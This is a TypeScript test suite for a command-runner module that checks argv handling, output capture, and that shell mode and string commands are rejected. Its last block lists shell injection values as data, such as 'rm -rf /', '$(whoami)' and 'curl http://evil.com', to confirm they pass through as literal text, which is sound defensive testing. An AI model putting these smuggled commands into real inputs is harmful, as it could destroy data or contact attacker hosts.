// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it } from "vitest";

import * as runner from "./runner";

describe("run with argv array", () => {
  it("executes a simple command and returns result", () => {
    const result = runner.run(["echo", "hello"], { suppressOutput: true });
    expect(result.status).toBe(0);
  });

  it("throws when argv array is empty", () => {
    expect(() => runner.run([])).toThrow(/must not be empty/);
  });

  it("returns non-zero status with ignoreError", () => {
    const result = runner.run(["false"], { ignoreError: true, suppressOutput: true });
    expect(result.status).not.toBe(0);
  });

  it("passes extra env vars to the child process", () => {
    const result = runner.run(["env"], {
      env: { NEMOCLAW_TEST_VAR: "injection-safe" },
      suppressOutput: true,
    });
    expect(result.status).toBe(0);
    expect(result.stdout.toString()).toContain("NEMOCLAW_TEST_VAR=injection-safe");
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.run(["echo", "hi"], { shell: true })).toThrow(/shell option is forbidden/);
  });

  it("rejects NUL bytes before spawning", () => {
    expect(() => runner.run(["echo", "bad\0arg"], { suppressOutput: true })).toThrow(/NUL bytes/);
    expect(() => runner.run(["\0echo"], { suppressOutput: true })).toThrow(/NUL bytes/);
  });

  it("rejects string commands", () => {
    // @ts-expect-error Exercise the runtime guard for legacy string input.
    expect(() => runner.run("echo hello", { suppressOutput: true })).toThrow(/argv array instead/);
  });

  it("surfaces ENOENT error for missing executables", () => {
    const result = runner.run(["nonexistent-binary-xyz-12345"], {
      ignoreError: true,
      suppressOutput: true,
    });
    // spawnSync sets result.error for missing executables
    expect(result.error).toBeDefined();
    expect((result.error as NodeJS.ErrnoException).code).toBe("ENOENT");
  });
});

describe("runShell", () => {
  it("runs an explicit shell command string", () => {
    const result = runner.runShell("echo hello", { suppressOutput: true });
    expect(result.status).toBe(0);
  });
});

describe("runInteractive with argv array", () => {
  it("executes an interactive argv command", () => {
    const result = runner.runInteractive(["echo", "hello"], { suppressOutput: true });
    expect(result.status).toBe(0);
  });

  it("rejects string commands", () => {
    // @ts-expect-error Exercise the runtime guard for legacy string input.
    expect(() => runner.runInteractive("echo hello", { suppressOutput: true })).toThrow(
      /argv array instead/,
    );
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.runInteractive(["echo", "hello"], { shell: true })).toThrow(
      /shell option is forbidden/,
    );
  });
});

describe("runInteractiveShell", () => {
  it("runs an explicit interactive shell command string", () => {
    const result = runner.runInteractiveShell("echo hello", { suppressOutput: true });
    expect(result.status).toBe(0);
  });
});

describe("runCapture with argv array", () => {
  it.each([
    ["echo", "hello world"],
    ["sh", "-c", "echo 'hello world'"],
  ])("captures stdout from an explicit %s command", (...argv) => {
    const output = runner.runCapture(argv);
    expect(output).toBe("hello world");
  });

  it("trims whitespace from output", () => {
    const output = runner.runCapture(["echo", "  trimmed  "]);
    expect(output).toBe("trimmed");
  });

  it("preserves output lines while trimming trailing blank lines", () => {
    const output = runner.runCapture([
      process.execPath,
      "-e",
      'process.stdout.write("line1\\n2048\\n\\n")',
    ]);
    expect(output).toBe("line1\n2048");
  });

  it("throws when argv array is empty", () => {
    expect(() => runner.runCapture([])).toThrow(/must not be empty/);
  });

  it("returns empty string on failure with ignoreError", () => {
    const output = runner.runCapture(["false"], { ignoreError: true });
    expect(output).toBe("");
  });

  it("keeps stderr out of ignored failures unless requested", () => {
    const output = runner.runCapture(
      [process.execPath, "-e", 'process.stderr.write("stderr-only\\n"); process.exit(2)'],
      { ignoreError: true },
    );
    expect(output).toBe("");
  });

  it("keeps stdout out of ignored failures unless combined output is requested", () => {
    const output = runner.runCapture(
      [process.execPath, "-e", 'process.stdout.write("stdout-only\\n"); process.exit(2)'],
      { ignoreError: true },
    );
    expect(output).toBe("");
  });

  it("captures stderr from ignored failures when requested", () => {
    const output = runner.runCapture(
      [
        process.execPath,
        "-e",
        'process.stdout.write("stdout-line\\n"); process.stderr.write("stderr-line\\n"); process.exit(2)',
      ],
      { ignoreError: true, includeStderr: true },
    );
    expect(output).toBe(["stdout-line", "stderr-line"].join("\n"));
  });

  it.each([undefined, false])("throws on failure when ignoreError is %s", (ignoreError) => {
    expect(() => runner.runCapture(["false"], { ignoreError })).toThrow();
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.runCapture(["echo", "hi"], { shell: true })).toThrow(
      /shell option is forbidden/,
    );
  });

  it("handles arguments with spaces and special characters", () => {
    const output = runner.runCapture(["echo", "hello world", "foo bar"]);
    expect(output).toBe("hello world foo bar");
  });

  it("passes extra env to the child process", () => {
    const output = runner.runCapture(["env"], { env: { TEST_ARGV_ENV: "captured" } });
    expect(output).toContain("TEST_ARGV_ENV=captured");
  });

  it("rejects string commands", () => {
    // @ts-expect-error Exercise the runtime guard for legacy string input.
    expect(() => runner.runCapture("echo hello")).toThrow(/argv array instead/);
  });

  it("throws ENOENT for missing executables", () => {
    expect(() => runner.runCapture(["nonexistent-binary-xyz-12345"])).toThrow();
  });

  it("returns empty string for missing executables with ignoreError", () => {
    const output = runner.runCapture(["nonexistent-binary-xyz-12345"], { ignoreError: true });
    expect(output).toBe("");
  });
});

describe("shell injection regression tests", () => {
  it.each([
    "my-sandbox; rm -rf /",
    "test$(whoami)",
    "sandbox`id`",
    "sandbox' || echo pwned",
    'sandbox" && echo pwned',
    "sandbox\necho pwned",
    'alpha"; rm -rf / #',
    "${HOME}",
    "`whoami`",
    "hello world; $(whoami)",
    "nvidia/model;curl http://evil.com",
  ])("passes shell metacharacters as literal arguments [%s]", (value) => {
    expect(runner.runCapture(["echo", value])).toBe(value);
  });
});
